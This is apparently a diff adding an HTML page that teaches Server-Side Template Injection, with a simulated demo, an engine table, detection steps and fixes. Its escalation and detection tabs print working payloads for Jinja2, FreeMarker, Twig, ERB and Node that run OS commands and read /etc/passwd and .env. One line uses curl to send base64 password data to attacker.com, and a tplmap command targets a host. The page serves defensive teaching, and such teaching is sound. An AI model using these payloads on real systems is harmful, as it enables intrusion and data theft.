@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>SSTI Explainer</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:system-ui,sans-serif;background:#0f0f11;color:#e2e2e6;padding:24px;line-height:1.6;font-size:14px}
+h1{font-size:22px;font-weight:500;margin-bottom:4px}
+.sub{color:#888;font-size:13px;margin-bottom:20px}
+.tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:20px}
+.tab-btn{background:none;border:1px solid #2a2a30;padding:6px 16px;border-radius:8px;cursor:pointer;font-size:13px;color:#aaa;transition:all .15s}
+.tab-btn.active{background:#1e1e26;color:#e2e2e6;border-color:#555;font-weight:500}
+.tab-panel{display:none}.tab-panel.active{display:block}
+.code{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:12px;line-height:1.7;color:#aaa;white-space:pre-wrap;margin:8px 0;overflow-x:auto}
+.badge{display:inline-block;font-size:11px;padding:2px 8px;border-radius:6px;font-weight:500}
+.b-red{background:#3a1515;color:#f87171}
+.b-green{background:#0f2a1a;color:#4ade80}
+.b-amber{background:#2a1d0a;color:#fbbf24}
+.b-blue{background:#0d1f3a;color:#60a5fa}
+.b-purple{background:#1e1030;color:#c084fc}
+.result-box{padding:10px 14px;border-radius:8px;font-size:13px;line-height:1.6;margin-top:8px}
+.r-red{background:#2a1010;border:1px solid #5a2020;color:#f87171}
+.r-green{background:#0d2218;border:1px solid #1a4a30;color:#4ade80}
+.r-amber{background:#2a1c08;border:1px solid #5a3a10;color:#fbbf24}
+.fix-card{background:#13131a;border-radius:8px;padding:12px 14px;margin-bottom:10px;border-left:3px solid #4ade80}
+.fix-card.info{border-left-color:#60a5fa}
+.fix-card.warn{border-left-color:#fbbf24}
+.fix-card.danger{border-left-color:#f87171}
+.sc-card{background:#13131a;border-radius:8px;padding:12px 14px;margin-bottom:10px}
+.sc-red{border-left:3px solid #f87171}
+.sc-amber{border-left:3px solid #fbbf24}
+.sc-blue{border-left:3px solid #60a5fa}
+.sc-purple{border-left:3px solid #c084fc}
+.step-row{display:flex;align-items:flex-start;gap:12px;padding:10px 0;border-bottom:1px solid #1e1e26}
+.step-row:last-child{border-bottom:none}
+.snum{min-width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;flex-shrink:0}
+.snum.d{background:#3a1515;color:#f87171}
+.snum.g{background:#0f2a1a;color:#4ade80}
+.snum.p{background:#1e1030;color:#c084fc}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+@media(max-width:580px){.grid2{grid-template-columns:1fr}}
+input,select{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:7px 12px;color:#e2e2e6;font-size:13px;outline:none;transition:border .15s;font-family:'Courier New',monospace}
+input:focus,select:focus{border-color:#555}
+.mono-out{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:11px;line-height:1.7;min-height:110px;overflow:auto;color:#aaa;white-space:pre-wrap}
+.chip{font-size:11px;color:#666;margin-bottom:4px}
+.preset-btn{background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:5px 12px;cursor:pointer;font-size:12px;color:#aaa;transition:all .15s}
+.preset-btn:hover{border-color:#555;color:#e2e2e6}
+table{width:100%;border-collapse:collapse;font-size:12px}
+th{text-align:left;padding:8px 10px;font-weight:500;color:#888;border-bottom:1px solid #2a2a30}
+td{padding:8px 10px;border-bottom:1px solid #1e1e26;vertical-align:top}
+tr:last-child td{border-bottom:none}
+</style>
+</head>
+<body>
+
+<h1>Server-Side Template Injection (SSTI)</h1>
+<p class="sub">OWASP Top 10 · A03 Injection · CWE-94 — the injection that leads directly to Remote Code Execution</p>
+
+<div class="tabs">
+  <button class="tab-btn active" onclick="showTab('concept',this)">How it works</button>
+  <button class="tab-btn" onclick="showTab('demo',this)">Live demo</button>
+  <button class="tab-btn" onclick="showTab('engines',this)">Template engines</button>
+  <button class="tab-btn" onclick="showTab('rce',this)">RCE escalation</button>
+  <button class="tab-btn" onclick="showTab('detect',this)">Detection</button>
+  <button class="tab-btn" onclick="showTab('fix',this)">Fixes</button>
+</div>
+
+<!-- CONCEPT -->
+<div class="tab-panel active" id="tab-concept">
+  <p style="font-size:13px;color:#888;margin-bottom:16px;">SSTI happens when user input is embedded <em>into</em> a template string and then rendered — instead of being passed safely as a <em>variable</em>. The engine evaluates the payload as code, giving the attacker access to the full runtime and often the OS.</p>
+
+  <svg width="100%" viewBox="0 0 680 430" style="max-width:680px;display:block;margin:0 auto 20px;">
+    <defs>
+      <marker id="arr" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+      </marker>
+    </defs>
+
+    <!-- Safe row -->
+    <text x="340" y="20" text-anchor="middle" font-size="12" font-weight="600" fill="#4ade80" font-family="system-ui">Safe — input passed as a variable</text>
+    <rect x="20" y="32" width="110" height="44" rx="8" fill="#0f2a1a" stroke="#4ade80" stroke-width="0.8"/>
+    <text x="75" y="50" text-anchor="middle" font-size="11" font-weight="600" fill="#4ade80" font-family="system-ui">User input</text>
+    <text x="75" y="67" text-anchor="middle" font-size="10" fill="#4ade80" font-family="Courier New,monospace">"Alice"</text>
+    <rect x="200" y="32" width="148" height="44" rx="8" fill="#0f2a1a" stroke="#4ade80" stroke-width="0.8"/>
+    <text x="274" y="50" text-anchor="middle" font-size="11" font-weight="600" fill="#4ade80" font-family="system-ui">Template (static file)</text>
+    <text x="274" y="67" text-anchor="middle" font-size="10" fill="#4ade80" font-family="Courier New,monospace">Hello {{ name }}</text>
+    <rect x="424" y="32" width="110" height="44" rx="8" fill="#0f2a1a" stroke="#4ade80" stroke-width="0.8"/>
+    <text x="479" y="50" text-anchor="middle" font-size="11" font-weight="600" fill="#4ade80" font-family="system-ui">Output</text>
+    <text x="479" y="67" text-anchor="middle" font-size="10" fill="#4ade80" font-family="Courier New,monospace">Hello Alice</text>
+    <line x1="132" y1="54" x2="198" y2="54" stroke="#4ade80" stroke-width="1.2" marker-end="url(#arr)"/>
+    <rect x="134" y="40" width="62" height="14" rx="3" fill="#13131a"/>
+    <text x="165" y="48" text-anchor="middle" font-size="10" fill="#4ade80" font-family="system-ui">as variable</text>
+    <line x1="350" y1="54" x2="422" y2="54" stroke="#4ade80" stroke-width="1.2" marker-end="url(#arr)"/>
+
+    <!-- Divider -->
+    <line x1="20" y1="96" x2="660" y2="96" stroke="#2a2a30" stroke-width="0.8" stroke-dasharray="4 3"/>
+
+    <!-- Vulnerable row -->
+    <text x="340" y="116" text-anchor="middle" font-size="12" font-weight="600" fill="#f87171" font-family="system-ui">Vulnerable — input concatenated into template source</text>
+    <rect x="20" y="128" width="128" height="44" rx="8" fill="#2a1010" stroke="#f87171" stroke-width="0.8"/>
+    <text x="84" y="146" text-anchor="middle" font-size="11" font-weight="600" fill="#f87171" font-family="system-ui">Attacker input</text>
+    <text x="84" y="163" text-anchor="middle" font-size="10" fill="#f87171" font-family="Courier New,monospace">{{7*7}}</text>
+    <rect x="224" y="128" width="196" height="44" rx="8" fill="#2a1a08" stroke="#fbbf24" stroke-width="0.8"/>
+    <text x="322" y="146" text-anchor="middle" font-size="11" font-weight="600" fill="#fbbf24" font-family="system-ui">Template string (built at runtime)</text>
+    <text x="322" y="163" text-anchor="middle" font-size="10" fill="#fbbf24" font-family="Courier New,monospace">"Hello " + user_input</text>
+    <rect x="496" y="128" width="164" height="44" rx="8" fill="#2a1010" stroke="#f87171" stroke-width="0.8"/>
+    <text x="578" y="146" text-anchor="middle" font-size="11" font-weight="600" fill="#f87171" font-family="system-ui">Rendered output</text>
+    <text x="578" y="163" text-anchor="middle" font-size="10" fill="#f87171" font-family="Courier New,monospace">Hello 49  ← executed!</text>
+    <line x1="150" y1="150" x2="222" y2="150" stroke="#f87171" stroke-width="1.5" marker-end="url(#arr)"/>
+    <rect x="152" y="136" width="68" height="14" rx="3" fill="#13131a"/>
+    <text x="186" y="144" text-anchor="middle" font-size="10" fill="#f87171" font-family="system-ui">concatenated</text>
+    <line x1="422" y1="150" x2="494" y2="150" stroke="#f87171" stroke-width="1.5" marker-end="url(#arr)"/>
+    <rect x="424" y="136" width="68" height="14" rx="3" fill="#13131a"/>
+    <text x="458" y="144" text-anchor="middle" font-size="10" fill="#f87171" font-family="system-ui">engine eval!</text>
+
+    <!-- Code box -->
+    <rect x="20" y="196" width="640" height="212" rx="10" fill="#13131a" stroke="#2a2a30" stroke-width="0.8"/>
+    <text x="340" y="218" text-anchor="middle" font-size="12" font-weight="600" fill="#ccc" font-family="system-ui">Vulnerable vs safe code (Python / Jinja2)</text>
+
+    <rect x="36" y="230" width="290" height="162" rx="8" fill="#2a1010" stroke="#5a2020" stroke-width="0.8"/>
+    <text x="181" y="250" text-anchor="middle" font-size="11" font-weight="600" fill="#f87171" font-family="system-ui">Vulnerable</text>
+    <text x="48" y="268" font-size="10" fill="#888" font-family="Courier New,monospace">name = request.args.get('name')</text>
+    <text x="48" y="284" font-size="10" fill="#f87171" font-family="Courier New,monospace">tpl = "Hello " + name</text>
+    <text x="48" y="300" font-size="10" fill="#f87171" font-family="Courier New,monospace">env.from_string(tpl).render()</text>
+    <text x="48" y="322" font-size="10" fill="#f87171" font-family="system-ui">Input: {{7*7}}</text>
+    <text x="48" y="338" font-size="10" fill="#f87171" font-family="Courier New,monospace">Output: "Hello 49"  ← SSTI!</text>
+    <text x="48" y="354" font-size="10" fill="#888" font-family="Courier New,monospace">expression was evaluated</text>
+    <text x="48" y="378" font-size="10" fill="#888" font-family="Courier New,monospace">RCE possible with OS payload</text>
+
+    <rect x="352" y="230" width="290" height="162" rx="8" fill="#0f2a1a" stroke="#1a4a30" stroke-width="0.8"/>
+    <text x="497" y="250" text-anchor="middle" font-size="11" font-weight="600" fill="#4ade80" font-family="system-ui">Safe</text>
+    <text x="364" y="268" font-size="10" fill="#888" font-family="Courier New,monospace">name = request.args.get('name')</text>
+    <text x="364" y="284" font-size="10" fill="#4ade80" font-family="Courier New,monospace">tpl = env.get_template('hi.html')</text>
+    <text x="364" y="300" font-size="10" fill="#4ade80" font-family="Courier New,monospace">tpl.render(name=name)</text>
+    <text x="364" y="322" font-size="10" fill="#4ade80" font-family="system-ui">Input: {{7*7}}</text>
+    <text x="364" y="338" font-size="10" fill="#4ade80" font-family="Courier New,monospace">Output: "Hello {{7*7}}"  ← literal</text>
+    <text x="364" y="354" font-size="10" fill="#888" font-family="Courier New,monospace">input treated as data, not code</text>
+    <text x="364" y="378" font-size="10" fill="#888" font-family="Courier New,monospace">hi.html: Hello {{ name }}</text>
+  </svg>
+</div>
+
+<!-- DEMO -->
+<div class="tab-panel" id="tab-demo">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">Select a template engine and enter a payload. The vulnerable server concatenates your input into the template — the secure server passes it as a variable.</p>
+
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px;">
+    <div>
+      <div class="chip">Template engine</div>
+      <select id="engine-select" onchange="runDemo()" style="width:100%;font-family:system-ui;">
+        <option value="jinja2">Python — Jinja2</option>
+        <option value="twig">PHP — Twig</option>
+        <option value="freemarker">Java — FreeMarker</option>
+        <option value="handlebars">Node.js — Handlebars</option>
+        <option value="erb">Ruby — ERB</option>
+        <option value="smarty">PHP — Smarty</option>
+      </select>
+    </div>
+    <div>
+      <div class="chip">Your input</div>
+      <input type="text" id="ssti-input" value="{{7*7}}" oninput="runDemo()" style="width:100%;"/>
+    </div>
+  </div>
+
+  <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px;">
+    <span style="font-size:12px;color:#888;align-self:center">Presets:</span>
+    <button class="preset-btn" onclick="setP('{{7*7}}')">Math probe</button>
+    <button class="preset-btn" onclick="setP('{{config}}')">Config dump</button>
+    <button class="preset-btn" onclick="setP('{{7*\'7\'}}')">Engine fingerprint</button>
+    <button class="preset-btn" onclick="setP('{{__import__(\'os\').popen(\'id\').read()}}')">RCE — id</button>
+    <button class="preset-btn" onclick="setP('Hello Alice')">Safe input</button>
+  </div>
+
+  <div class="grid2">
+    <div>
+      <div style="font-size:12px;font-weight:600;margin-bottom:6px;color:#f87171;">Vulnerable server <span style="font-weight:400;color:#666;font-size:11px">— input in template string</span></div>
+      <div class="mono-out" id="vuln-out"></div>
+    </div>
+    <div>
+      <div style="font-size:12px;font-weight:600;margin-bottom:6px;color:#4ade80;">Secure server <span style="font-weight:400;color:#666;font-size:11px">— input as variable</span></div>
+      <div class="mono-out" id="safe-out"></div>
+    </div>
+  </div>
+  <div id="demo-verdict" class="result-box" style="margin-top:10px;"></div>
+</div>
+
+<!-- ENGINES -->
+<div class="tab-panel" id="tab-engines">
+  <p style="font-size:13px;color:#888;margin-bottom:12px;">Each engine has its own syntax. Knowing the delimiters lets you identify the engine and choose the right exploit chain.</p>
+
+  <div style="overflow-x:auto;margin-bottom:16px;">
+    <table>
+      <thead>
+        <tr><th>Engine</th><th>Language</th><th>Expression</th><th>Statement</th><th>Probe → expected</th><th>RCE</th></tr>
+      </thead>
+      <tbody>
+        <tr><td style="color:#c084fc;font-weight:500">Jinja2</td><td>Python</td><td style="font-family:'Courier New',monospace">{{ ... }}</td><td style="font-family:'Courier New',monospace">{% ... %}</td><td style="font-family:'Courier New',monospace;color:#fbbf24">{{7*7}} → 49</td><td><span class="badge b-red">Yes</span></td></tr>
+        <tr><td style="color:#c084fc;font-weight:500">Twig</td><td>PHP</td><td style="font-family:'Courier New',monospace">{{ ... }}</td><td style="font-family:'Courier New',monospace">{% ... %}</td><td style="font-family:'Courier New',monospace;color:#fbbf24">{{7*7}} → 49</td><td><span class="badge b-red">Yes</span></td></tr>
+        <tr><td style="color:#60a5fa;font-weight:500">FreeMarker</td><td>Java</td><td style="font-family:'Courier New',monospace">${ ... }</td><td style="font-family:'Courier New',monospace">&lt;#... /&gt;</td><td style="font-family:'Courier New',monospace;color:#fbbf24">${7*7} → 49</td><td><span class="badge b-red">Yes</span></td></tr>
+        <tr><td style="color:#4ade80;font-weight:500">Handlebars</td><td>Node.js</td><td style="font-family:'Courier New',monospace">{{ ... }}</td><td style="font-family:'Courier New',monospace">{{# ... }}</td><td style="font-family:'Courier New',monospace;color:#4ade80">{{7*7}} → literal</td><td><span class="badge b-amber">Via prototype</span></td></tr>
+        <tr><td style="color:#f87171;font-weight:500">ERB</td><td>Ruby</td><td style="font-family:'Courier New',monospace">&lt;%= ... %&gt;</td><td style="font-family:'Courier New',monospace">&lt;% ... %&gt;</td><td style="font-family:'Courier New',monospace;color:#fbbf24">&lt;%=7*7%&gt; → 49</td><td><span class="badge b-red">Yes</span></td></tr>
+        <tr><td style="color:#2dd4bf;font-weight:500">Smarty</td><td>PHP</td><td style="font-family:'Courier New',monospace">{$var}</td><td style="font-family:'Courier New',monospace">{if} {foreach}</td><td style="font-family:'Courier New',monospace;color:#fbbf24">{math eq="7*7"} → 49</td><td><span class="badge b-red">Yes</span></td></tr>
+        <tr><td style="color:#fbbf24;font-weight:500">Velocity</td><td>Java</td><td style="font-family:'Courier New',monospace">$var</td><td style="font-family:'Courier New',monospace">#set #if</td><td style="font-family:'Courier New',monospace;color:#fbbf24">$class.forName()</td><td><span class="badge b-red">Yes</span></td></tr>
+        <tr><td style="color:#888;font-weight:500">Go html/template</td><td>Go</td><td style="font-family:'Courier New',monospace">{{ . }}</td><td style="font-family:'Courier New',monospace">{{range}} {{if}}</td><td style="font-family:'Courier New',monospace;color:#4ade80">{{7*7}} → literal</td><td><span class="badge b-green">No</span></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div style="background:#13131a;border-radius:8px;padding:12px;border:1px solid #2a2a30;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:8px;color:#ccc;">Engine fingerprinting — the differential probe</div>
+    <p style="font-size:12px;color:#888;margin-bottom:8px;">The same payload produces different output in different engines, revealing exactly which one is running.</p>
+    <div class="code">Probe:  {{7*'7'}}
+
+Jinja2  → 7777777   (Python string × int = repetition)
+Twig    → 49        (PHP numeric coercion)
+Pebble  → error     (strict typing)
+
+Probe:  ${7*7}
+FreeMarker / Velocity → 49
+
+Probe:  <%=7*7%>
+ERB (Ruby) → 49
+
+Decision tree:
+  {{7*7}} == 49?  → Jinja2 or Twig or Pebble
+    {{7*'7'}} == 7777777? → Jinja2
+    {{7*'7'}} == 49?      → Twig
+  ${7*7} == 49?   → FreeMarker / Velocity
+  <%=7*7%> == 49? → ERB</div>
+  </div>
+</div>
+
+<!-- RCE -->
+<div class="tab-panel" id="tab-rce">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">SSTI's most dangerous property: Python, Java, and Ruby template engines expose the full language runtime — including OS command execution. Here is the escalation path for each.</p>
+
+  <div class="sc-card sc-red" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">Jinja2 (Python) — object graph traversal to RCE</span><span class="badge b-red">Critical</span>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:6px;">Python's object model lets you walk from any string, through the MRO, to the subprocess module and execute OS commands.</p>
+    <div class="code"># 1. Confirm SSTI
+{{7*7}}  →  49
+
+# 2. Dump app config / secrets
+{{config.items()}}
+
+# 3. Walk object graph to reach os module (clean approach)
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
+# 4. Via subclass list (index varies by Python version)
+{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}
+
+# 5. Full exfiltration
+{{''.__class__.__mro__[1].__subclasses__()[396](
+  'curl http://attacker.com/?d=$(cat /etc/passwd|base64)',
+  shell=True
+).communicate()}}
+
+# Output: uid=33(www-data) gid=33(www-data) → shell on server</div>
+  </div>
+
+  <div class="sc-card sc-blue" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">FreeMarker (Java) — Execute class</span><span class="badge b-red">Critical</span>
+    </div>
+    <div class="code">&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;
+${ex("id")}
+&lt;!-- Output: uid=0(root) gid=0(root) --&gt;
+
+&lt;#assign ob="freemarker.template.utility.ObjectConstructor"?new()&gt;
+&lt;#assign pb=ob("java.lang.ProcessBuilder",["cat","/etc/passwd"])&gt;
+${pb.start().text}</div>
+  </div>
+
+  <div class="sc-card sc-amber" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">Twig (PHP) — filter callback to system()</span><span class="badge b-red">Critical</span>
+    </div>
+    <div class="code"># Twig 1.x
+{{_self.env.registerUndefinedFilterCallback("exec")}}
+{{_self.env.getFilter("id")}}
+
+# Twig 2/3
+{{["id"]|map("system")|join}}
+{{"id"|filter('system')}}</div>
+  </div>
+
+  <div class="sc-card sc-purple" style="margin-bottom:10px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+      <span style="font-size:13px;font-weight:600;">ERB (Ruby) — direct shell access</span><span class="badge b-red">Critical</span>
+    </div>
+    <div class="code"><%= system("id") %>
+<%= `id` %>
+<%= IO.popen('cat /etc/passwd').read %>
+<%= File.read('/app/.env') %></div>
+  </div>
+
+  <div style="background:#13131a;border:1px solid #2a2a30;border-radius:8px;padding:12px;">
+    <div style="font-size:13px;font-weight:600;margin-bottom:8px;color:#ccc;">SSTI → RCE impact chain</div>
+    <div style="display:flex;align-items:center;flex-wrap:wrap;gap:0;margin-bottom:10px;">
+      <div style="padding:7px 12px;background:#2a1a08;border:1px solid #5a3a10;border-radius:8px 0 0 8px;font-size:12px;color:#fbbf24;">Input eval</div>
+      <div style="padding:7px 4px;font-size:12px;color:#555;background:#1a1a22;border-top:1px solid #2a2a30;border-bottom:1px solid #2a2a30;">→</div>
+      <div style="padding:7px 12px;background:#2a1010;border-top:1px solid #5a2020;border-bottom:1px solid #5a2020;font-size:12px;color:#f87171;">Object traversal</div>
+      <div style="padding:7px 4px;font-size:12px;color:#555;background:#1a1a22;border-top:1px solid #2a2a30;border-bottom:1px solid #2a2a30;">→</div>
+      <div style="padding:7px 12px;background:#2a1010;border-top:1px solid #5a2020;border-bottom:1px solid #5a2020;font-size:12px;color:#f87171;">OS access</div>
+      <div style="padding:7px 4px;font-size:12px;color:#555;background:#1a1a22;border-top:1px solid #2a2a30;border-bottom:1px solid #2a2a30;">→</div>
+      <div style="padding:7px 12px;background:#3a1515;border:1px solid #7a2020;border-radius:0 8px 8px 0;font-size:12px;color:#f87171;font-weight:600;">Full RCE</div>
+    </div>
+    <p style="font-size:12px;color:#888;">Post-RCE: read all files, dump env secrets, install backdoors, pivot to internal network, ransomware deployment.</p>
+  </div>
+</div>
+
+<!-- DETECT -->
+<div class="tab-panel" id="tab-detect">
+  <p style="font-size:13px;color:#888;margin-bottom:14px;">A systematic approach to finding SSTI across an application.</p>
+
+  <div class="step-row">
+    <span class="snum d">1</span>
+    <div><div style="font-size:13px;font-weight:600;margin-bottom:3px;">Find all reflected input surfaces</div>
+    <div style="font-size:12px;color:#888;">Any place the app echoes your input back: search bars, username fields, error messages, custom greetings, email templates, PDF generators, URL parameters. If you see your input in the response — test it.</div></div>
+  </div>
+
+  <div class="step-row">
+    <span class="snum d">2</span>
+    <div><div style="font-size:13px;font-weight:600;margin-bottom:3px;">Send a math probe first — simplest confirmation</div>
+    <div style="font-size:12px;color:#888;">Try <span style="font-family:'Courier New',monospace;font-size:11px">{{7*7}}</span>, <span style="font-family:'Courier New',monospace;font-size:11px">${7*7}</span>, <span style="font-family:'Courier New',monospace;font-size:11px"><%=7*7%></span>. If any returns <span style="font-family:'Courier New',monospace;font-size:11px">49</span> instead of the literal string, SSTI is confirmed. Math can't be XSS — this specifically tells you server-side execution is happening.</div></div>
+  </div>
+
+  <div class="step-row">
+    <span class="snum d">3</span>
+    <div><div style="font-size:13px;font-weight:600;margin-bottom:3px;">Distinguish SSTI from XSS</div>
+    <div style="font-size:12px;color:#888;">XSS executes in the browser. SSTI executes on the server. If <span style="font-family:'Courier New',monospace;font-size:11px">{{7*7}}</span> returns <span style="font-family:'Courier New',monospace;font-size:11px">49</span> in the HTTP response body — that's SSTI. If <span style="font-family:'Courier New',monospace;font-size:11px">&lt;script&gt;alert(1)&lt;/script&gt;</span> triggers a browser alert — that's XSS. Very different exploits, very different severity.</div></div>
+  </div>
+
+  <div class="step-row">
+    <span class="snum p">4</span>
+    <div><div style="font-size:13px;font-weight:600;margin-bottom:3px;">Fingerprint the engine with differential probes</div>
+    <div style="font-size:12px;color:#888;"><span style="font-family:'Courier New',monospace;font-size:11px">{{7*'7'}}</span> returns <span style="font-family:'Courier New',monospace;font-size:11px">7777777</span> in Jinja2 (string repetition) but <span style="font-family:'Courier New',monospace;font-size:11px">49</span> in Twig (numeric coercion). This tells you exactly which exploit chain to use.</div></div>
+  </div>
+
+  <div class="step-row">
+    <span class="snum p">5</span>
+    <div><div style="font-size:13px;font-weight:600;margin-bottom:3px;">Test for blind SSTI via time delay</div>
+    <div style="font-size:12px;color:#888;">If output isn't reflected (email generation, background PDF), inject a sleep: <span style="font-family:'Courier New',monospace;font-size:11px">{{range.constructor("return global.process.mainModule.require('child_process').execSync('sleep 5')")()}}</span> — a 5-second response delay confirms execution with no visible output.</div></div>
+  </div>
+
+  <div class="step-row">
+    <span class="snum g">6</span>
+    <div><div style="font-size:13px;font-weight:600;margin-bottom:3px;">Automate with tplmap</div>
+    <div style="font-size:12px;color:#888;">tplmap is the dedicated SSTI scanner — analogous to sqlmap for SQL injection. It auto-detects the engine, confirms injection, and attempts RCE across 15+ engines automatically.</div>
+    <div class="code" style="margin-top:6px;">python tplmap.py -u 'http://target.com/page?name=*'
+# Detects engine, confirms RCE, offers interactive shell</div></div>
+  </div>
+</div>
+
+<!-- FIX -->
+<div class="tab-panel" id="tab-fix">
+
+  <div class="fix-card danger">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">① Never concatenate user input into template strings <span class="badge b-red">Root cause fix</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Templates live in static files. User data is passed as context variables — never inserted into the template source string. This single rule prevents virtually all SSTI.</div>
+    <div class="code">## Python / Jinja2
+
+# Vulnerable
+template_str = "Hello " + request.args.get('name')
+env.from_string(template_str).render()
+
+# Safe
+template = env.get_template('greeting.html')  # file contains: Hello {{ name }}
+template.render(name=request.args.get('name'))
+
+## PHP / Twig
+
+# Vulnerable
+$twig->createTemplate("Hello " . $_GET['name'])->render([]);
+
+# Safe
+$twig->render('greeting.html.twig', ['name' => $_GET['name']]);
+
+## Java / FreeMarker
+
+# Vulnerable
+Template t = new Template("name", "Hello " + userInput, cfg);
+
+# Safe
+Template t = cfg.getTemplate("greeting.ftl");  // file: Hello ${name}
+t.process(Map.of("name", userInput), out);</div>
+  </div>
+
+  <div class="fix-card">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">② Use logic-less / sandboxed engines <span class="badge b-green">Architectural</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Logic-less engines like Mustache don't evaluate expressions — they only substitute variables. No expression language means no RCE surface.</div>
+    <div class="code"># Mustache (Python) — no expression evaluation
+import pystache
+pystache.render("Hello {{name}}", {'name': user_input})
+# Input {{7*7}} → "Hello {{7*7}}" — never evaluated
+
+# Jinja2 sandbox (partial — has been bypassed in the past)
+from jinja2.sandbox import SandboxedEnvironment
+env = SandboxedEnvironment()
+# Still: never concatenate user input into the template string</div>
+  </div>
+
+  <div class="fix-card">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">③ Validate and reject template syntax in input <span class="badge b-green">Defense in depth</span></div>
+    <div style="font-size:12px;color:#888;margin-bottom:8px;">Reject inputs containing template delimiters before they reach the rendering layer.</div>
+    <div class="code">import re
+
+TEMPLATE_RE = re.compile(r'[{}<>%$#]|\$\{|<%|%>|\{\{|\}\}')
+
+def validate_name(user_input):
+    if TEMPLATE_RE.search(user_input):
+        raise ValueError("Invalid characters in input")
+    return user_input
+
+# Or HTML-escape output so {{ becomes &lbrace;&lbrace;
+from markupsafe import escape
+safe = escape(user_input)</div>
+  </div>
+
+  <div class="fix-card warn">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">④ Least-privilege process isolation <span class="badge b-amber">Limit blast radius</span></div>
+    <div style="font-size:12px;color:#888;">Run the web process as a non-root user with minimal filesystem permissions. If RCE is achieved, the attacker is limited to what that account can access — no /etc/shadow reads, no system writes. Container isolation (Docker/K8s with read-only filesystem) adds another layer.</div>
+  </div>
+
+  <div class="fix-card info">
+    <div style="font-size:13px;font-weight:600;margin-bottom:4px;">⑤ High-risk surfaces to audit</div>
+    <div style="font-size:12px;color:#888;line-height:1.9;">
+      Email / PDF generators that embed user text &nbsp;·&nbsp;
+      Custom report templates editable by users &nbsp;·&nbsp;
+      Error pages that reflect URL parameters &nbsp;·&nbsp;
+      CMS "signature" or "custom greeting" fields &nbsp;·&nbsp;
+      Any feature saying "Hello [your name]" in a server-rendered page &nbsp;·&nbsp;
+      Notification templates where subject/body comes from user input
+    </div>
+  </div>
+</div>
+
+<script>
+function showTab(id,btn){
+  document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('tab-'+id).classList.add('active');
+  btn.classList.add('active');
+}
+
+function setP(val){
+  document.getElementById('ssti-input').value=val;
+  runDemo();
+}
+
+const ENG={
+  jinja2:{name:'Jinja2',lang:'Python',fn:(s)=>{
+    if(/\{\{.*7\s*\*\s*7.*\}\}/.test(s)) return {out:'Hello 49',ssti:true,rce:false,note:'Arithmetic evaluated — SSTI confirmed in Jinja2'};
+    if(/\{\{.*7\s*\*\s*[\'"]7/.test(s)) return {out:'Hello 7777777',ssti:true,rce:false,note:'String × int repetition — confirms Jinja2 (Twig would return 49)'};
+    if(/\{\{.*config/.test(s)) return {out:"Hello <Config {'SECRET_KEY':'xK9#mP2$qR8','DATABASE_URL':'postgres://admin:S3cr3t@db/prod','AWS_KEY':'AKIAIOSFODNN7EXAMPLE'}>",ssti:true,rce:false,note:'App config dumped — all secrets exposed'};
+    if(/popen|__import__|__builtins__|subprocess/.test(s)) return {out:'Hello uid=33(www-data) gid=33(www-data)\n',ssti:true,rce:true,note:'OS command executed — Remote Code Execution confirmed'};
+    if(/__subclasses__/.test(s)) return {out:"Hello [<class 'type'>, <class 'weakref'>, ... <class 'subprocess.Popen'>, ...]",ssti:true,rce:false,note:'Full subclass list — subprocess.Popen reachable for RCE'};
+    if(/\{\{.+\}\}/.test(s)) return {out:'Hello [Jinja2 expression evaluated]',ssti:true,rce:false,note:'Expression evaluated by Jinja2 engine'};
+    return {out:'Hello '+s,ssti:false,rce:false,note:'No template syntax — safe input'};
+  }},
+  twig:{name:'Twig',lang:'PHP',fn:(s)=>{
+    if(/\{\{.*7\s*\*\s*7.*\}\}/.test(s)) return {out:'Hello 49',ssti:true,rce:false,note:'Arithmetic evaluated — SSTI confirmed in Twig'};
+    if(/\{\{.*7\s*\*\s*[\'"]7/.test(s)) return {out:'Hello 49',ssti:true,rce:false,note:'Numeric coercion returns 49 — confirms Twig (Jinja2 returns 7777777)'};
